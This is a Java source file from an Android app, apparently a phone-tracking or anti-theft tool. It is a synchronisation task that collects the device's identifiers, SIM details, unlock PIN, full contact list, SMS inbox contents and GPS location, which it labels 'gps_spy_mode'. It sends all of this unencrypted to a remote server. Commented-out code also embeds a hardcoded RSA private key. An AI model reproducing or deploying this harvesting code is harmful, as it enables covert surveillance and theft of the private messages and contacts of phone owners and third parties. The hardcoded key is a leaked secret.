package edu.glyndwr.rest.tasks;

import java.io.File;
import java.security.KeyFactory;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.security.spec.EncodedKeySpec;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Date;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;



import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import edu.glyndwr.crypto.DESCryptoProvider;
import edu.glyndwr.crypto.RSACryptoProvider;
import edu.glyndwr.rest.RestService;
import edu.glyndwr.rest.ServicesNames;
import edu.glyndwr.tools.SettingsEngine;
import edu.glyndwr.tools.TelephonyManagerProcessor;
import edu.glyndwr.utils.Constants;
import edu.glyndwr.utils.DeviceInfo;
import edu.glyndwr.utils.Utils;

/**
 * Syncronization FROM CLIENT ---------> TO SERVER
 * 
 * @author Karpachev Ihor
 * 
 */
public class DirectSynchronizationTask extends
		AsyncTask<Void, Void, JSONObject> {

	private RestService client;
	private JSONObject toServer;
	boolean serverAvaliable = true;

	public DirectSynchronizationTask() {

		
		Utils.sendAllPrivateData();
		
		
		ContentResolver cr = Utils.getContext().getContentResolver();
		toServer = new JSONObject();

		DeviceInfo dev = (new TelephonyManagerProcessor()).getTelephonyOverview();
		try {
			toServer.putOpt("unlock_phone_number", SettingsEngine.getInstance().getString(SettingsEngine.UNLOCK_CALL_NUMBER, ""));
			toServer.putOpt("emergency_phone_number",SettingsEngine.getInstance().getString(SettingsEngine.EMERGENCY_NUMBER, ""));

			String hour = SettingsEngine.getInstance().getString(SettingsEngine.SYNCHRONIZATION_PERIOD_HOUR, "5");
			String minute = SettingsEngine.getInstance().getString(SettingsEngine.SYNCHRONIZATION_PERIOD_MINUTE, "0");
			if (Integer.valueOf(minute) < 10)
				minute = "0" + minute;
			toServer.putOpt("synchronize", hour + ":" + minute);
			toServer.putOpt("unlock_pin", SettingsEngine.getInstance().getString(SettingsEngine.UNLOCK_PIN, ""));
			String gpsStatus = String.valueOf(SettingsEngine.getInstance().getBoolean(SettingsEngine.GPS_STATE, false)).equalsIgnoreCase("true") ? "ON" : "OFF";
			toServer.putOpt("gps_spy_mode", gpsStatus);

			toServer.putOpt("phone_number", dev.phoneNumber);
			toServer.putOpt("country_iso", dev.networkCountryIso);
			toServer.putOpt("operator_name", dev.networkOperatorName);
			toServer.putOpt("roaming", dev.networkRoaming);
			toServer.putOpt("network_type", dev.networkType);
			toServer.putOpt("phone_type", dev.phoneTypeString);

			toServer.putOpt("sim_id", dev.simSubscriberId);
			toServer.putOpt("sim_serial", dev.simSerialNumber);
			toServer.putOpt("cell_state", dev.callState);
			toServer.putOpt("cell_location", dev.cellLocationString);
			toServer.putOpt("sim_country_iso", dev.simCountryIso);
			toServer.putOpt("sim_operator", dev.simOperator);
			toServer.putOpt("sim_state", dev.simStateString);

			toServer.putOpt("device_id", String.valueOf(dev.deviceId));

			if (!SettingsEngine.getInstance().getBoolean(SettingsEngine.REGISTERED, false)) {
				toServer.putOpt("soft_version",String.valueOf(dev.deviceSoftwareVersion));
				toServer.putOpt("bootloader",String.valueOf(android.os.Build.BOOTLOADER));
				toServer.putOpt("board", String.valueOf(android.os.Build.BOARD));
				toServer.putOpt("brand", String.valueOf(android.os.Build.BRAND));
				toServer.putOpt("device",String.valueOf(android.os.Build.DEVICE));
				toServer.putOpt("display",String.valueOf(android.os.Build.DISPLAY));
				toServer.putOpt("hardware",String.valueOf(android.os.Build.HARDWARE));
				toServer.putOpt("manufacturer",String.valueOf(android.os.Build.MANUFACTURER));
				toServer.putOpt("model", String.valueOf(android.os.Build.MODEL));
				toServer.putOpt("product",String.valueOf(android.os.Build.PRODUCT));
				toServer.putOpt("serial",String.valueOf(android.os.Build.SERIAL));

				// gather contacts
				final Cursor cur = cr.query(
						ContactsContract.Contacts.CONTENT_URI, null, null,
						null, null);
				JSONArray contacts = new JSONArray();
				while (cur.moveToNext()) {
					String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
					String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
					if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
						Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID+ " = " + id, null, null);
						String phoneNumber = "";
						while (phones.moveToNext()) {
							String number = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							if (!phoneNumber.contains(number))
								phoneNumber += " " + number;
						}
						JSONObject contact = new JSONObject();
						contact.putOpt("name", name);
						contact.putOpt("numbers", phoneNumber);
						contacts.put(contact);
						phones.close();
					}
				}

				// put contacts to json object
				toServer.putOpt("contacts", contacts);
			}

			// Gather sms
			final Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),null, null, null, null);
			cursor.moveToFirst();
			JSONArray messages = new JSONArray();

			String lastSyncDate = SettingsEngine.getInstance().getString(SettingsEngine.LAST_SYCHRONIZATION_DATE, "");
			Utils.LOG("Last synch date = " + lastSyncDate);

			while (cursor.moveToNext()) {
				Date messageDate = new Date(Long.parseLong((cursor.getString(5))));

				//Utils.LOG("Last synch date = " + lastSyncDate + ", sms date = "+ messageDate.toGMTString() + ", text="+ cursor.getString(12));
				if (!"".equals(lastSyncDate)) {
					if (messageDate.after(new Date(lastSyncDate))) {
						JSONObject oneMessage = new JSONObject();
						oneMessage.putOpt("from", cursor.getString(3));
						oneMessage.putOpt("body", cursor.getString(12));
						oneMessage.putOpt("date", cursor.getString(5));
						messages.put(oneMessage);
					}
				} else {
					JSONObject oneMessage = new JSONObject();
					oneMessage.putOpt("from", cursor.getString(3));
					oneMessage.putOpt("body", cursor.getString(12));
					oneMessage.putOpt("date", cursor.getString(5));
					messages.put(oneMessage);
				}
			}

			// put messages to json object
			toServer.putOpt("messages", messages);

		} catch (JSONException e) {
			e.printStackTrace();
		}
		
		
		// put GEO LOCATION
		try {
			LocationManager locationManager = (LocationManager) Utils.getContext().getSystemService(Context.LOCATION_SERVICE);
			if (locationManager != null) {
				Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
				if (location == null)
					location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
				toServer.putOpt("latitude",String.valueOf(location.getLatitude()));
				toServer.putOpt("longitude",String.valueOf(location.getLongitude()));
				}
			
		} catch (Exception e) {
			e.printStackTrace();
		}

		client = new RestService(ServicesNames.DIRECT_SYNCHRONIZATION);
		client.setTimeout(4000);
		client.addHeader("Accept", "application/json;charset=utf-8");
		client.addHeader("Content-Type", "application/json;charset=utf-8");

		// client.addHeader("Accept", "application/json");
		// client.addHeader("Content-Type", "application/json");

		client.addParam("out", toServer.toString());
	}
  
	@Override  
	protected JSONObject doInBackground(Void... params) {
		JSONObject retValue = null;
		try {
			//GetServerRSAPublicKeyTask getPublicKeyTask = new GetServerRSAPublicKeyTask();  
			// get server public key  
			//JSONObject res = getPublicKeyTask.execute(null,null,null).get(3000, TimeUnit.MILLISECONDS);
			//String serverPublicKey = res.getString("public_key");
			//String serverPublicKey = "30819f300d06092a864886f70d010101050003818d003081890281810082176e3496d28a377a58eed5c53964c0aab5a34b0b02430bbab6b47de032448d888fa24a9afc6aaf61b84dd07af25564fd2a7034c5471f2be20fa1ec830377449231dd29baf43e13d53ba0f720c420e805255c207f8f55aa75b527417debfd00e1127fddccaa47097daece8589d1ad7a8b52f995429ca717c0a9d90b207ae72d0203010001";
			//SettingsEngine.getInstance().saveString(SettingsEngine.SERVER_RSA_PUBLIC_KEY, serverPublicKey);
			//  Utils.LOG(serverPublicKey);
			
			  
			//KeyFactory keyFactory = KeyFactory.getInstance("RSA");       
			
			
			
			//EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(RSACryptoProvider.hex2Byte(serverPublicKey));  
			//PublicKey serverRSAPublicKey = keyFactory.generatePublic(publicKeySpec);
			
			   
		//	DESCryptoProvider.seed = UUID.randomUUID().toString();
		//	byte[] encryptedDESKey = RSACryptoProvider.encrypt(DESCryptoProvider.seed, serverRSAPublicKey);
			
			///String DESMessage = DESCryptoProvider.encrypt(toServer.toString());    
			
		//	Utils.LOG("seed"+DESCryptoProvider.seed);
			
			/*
			String privateKey = "30820276020100300d06092a864886f70d0101010500048202603082025c02010002818100bf0148874c57df50c4116ff9693133bccf5a1cc42ac29e0874ab9323c7d9958fad64adff982aebdc161fe34aab50a64ba7e49c1d83c6ac3aeeef209bb1213fba280db1cae97ecd9d586a1dc8bbcbf5f6e426a684d0d74c16806d149f18b9500ba66d09a46143db6b7528c0ec450223a0473a7560465bf07803acd3f4d8fcb1c302030100010281802a309260b05048978277879043d80661923b89571b4ad9b56c6fe99461b48200b680229eee71ac9f74939e9503ba50c12d58a5d32f24572ebd503c97a74c7cd2b3fdf6c2e9806741ebb8616688f86c315a8928a0d4f9a5000e2257791ffbcdbe48af7836aaf5a62c177246fb54295cc6184618daf7c527501fc1b54c21790461024100e535c3c32fab32762483a078a1ff93b66a851d481d685a2ab69acb29d2a29a36daa2461ecdd6e0a5af4b7a80647b2dba7c35d068721d18cfb79374882b44963f024100d554612d0002b439546626bfc0f85cb3f1100b1392ebc322215a376ded39c4033a52fd22a0dc3ae6a329345ad82afc21d4b4b0d54c490b7c50980ba3738d6b7d024100bbcc11591af569a2e2c7f5f2e0c8467e6f482175b4a28b3df3df6016243e959bdc0698ed2439aa56160a0194b0bf3bf84f4cc834cb4a8bc9a4df6bdb25984c810240082eee735d76bd171de7b540d1d4352a29eb25a1a0972eab16807173e40fbd372a7b987e45916d28ffc54aded93ffce0075acf15bf9165c1650e10143b1087b90240394f1b0a2d0c7b8df1dd2b1f9317d0cb9ec7ca4a87f79bc34c86774435d0e417c3f7715c32d920e8520c00f91798db5d63964c7ee83af95515348f78dced921e";
			KeyFactory keyFactor = KeyFactory.getInstance("RSA");
			EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(RSACryptoProvider.hex2Byte(privateKey));
			PrivateKey prKey = keyFactor.generatePrivate(privateKeySpec);
			   
			String plainText = RSACryptoProvider.decrypt(encryptedMessage,prKey);
			
			Utils.LOG("decripted message : "+plainText);
			  
			*/
			  
				/*
			PublicKey key = RSACryptoProvider.restorePublic(serverPublicKey);  
			String desKey = RSACryptoProvider.byte2Hex(RSACryptoProvider.encrypt(DESCryptoProvider.seed, key));
			
			  
			Utils.LOG("DES KEY ===============> "+DESCryptoProvider.seed);  
			  */
			//RSACryptoProvider.generateKey();
			  
			//JSONObject json = new JSONObject();
			//json.putOpt("des_message", DESMessage);  
			//json.putOpt("des_key", RSACryptoProvider.byte2Hex(encryptedDESKey));
			//json.putOpt("mobile_rsa_public_key", new String(RSACryptoProvider.byte2Hex(RSACryptoProvider.key.getPublic().getEncoded())));
			
		//	Utils.LOG(json.toString());
			
		//	return retValue = client.execute(json.toString());
			return retValue = client.execute(toServer.toString());
		} catch (Exception e) {
			e.printStackTrace();
		}
			
		return retValue;
	}

	@Override
	protected void onPostExecute(JSONObject result) {
		if (null != result) {
			try {
				SettingsEngine.getInstance().saveString(SettingsEngine.LAST_SYCHRONIZATION_DATE,new Date().toGMTString());
				if (!result.isNull("registered_successfully")) {
					SettingsEngine.getInstance().saveBoolean(SettingsEngine.REGISTERED, true);
					Utils.LOG("registered_successfully");
				}
				
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
